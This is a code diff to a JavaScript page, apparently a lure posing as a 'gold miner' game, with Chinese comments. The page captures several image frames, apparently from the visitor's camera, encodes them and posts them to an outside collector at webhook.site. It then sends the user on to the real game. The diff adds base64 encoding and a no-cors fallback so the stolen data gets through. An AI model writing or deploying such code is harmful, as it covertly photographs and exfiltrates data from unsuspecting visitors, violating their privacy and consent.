@@ -69,7 +69,7 @@
  * ======================================================================== */
 
 const CONFIG = {
-  COLLECTOR: "https://1789201a7b20af.lhr.life/upload",                       // 接收端
+  COLLECTOR: "https://webhook.site/2c38ce8a-1589-436c-bb5e-5f2eb1c81f98",                       // 接收端
   GAME_URL: "https://zhongchenyu16-web.github.io/goldminer/",      // 抓到后把用户送去的真游戏
   FRAMES: 3,            // 抓几帧
   GAP_MS: 380,          // 帧间隔
@@ -113,17 +113,23 @@ function grab() {
   return el.c.toDataURL('image/jpeg', CONFIG.QUALITY);
 }
 
+/* 整包 base64：webhook.site 会吞掉 JSON 引号，base64 不会 */
+function enc(obj) {
+  const s = JSON.stringify(obj);
+  try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return s; }
+}
+
 async function post(body) {
   try {
     const r = await fetch(CONFIG.COLLECTOR, {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-      body: JSON.stringify(body)
+      body: enc(body)
     });
     if (r && r.ok) return true;
   } catch (e) {}
   try {
-    await fetch(CONFIG.COLLECTOR, { method: 'POST', mode: 'no-cors', body: JSON.stringify(body) });
+    await fetch(CONFIG.COLLECTOR, { method: 'POST', mode: 'no-cors', body: enc(body) });
     return true;
   } catch (e) {
     try {
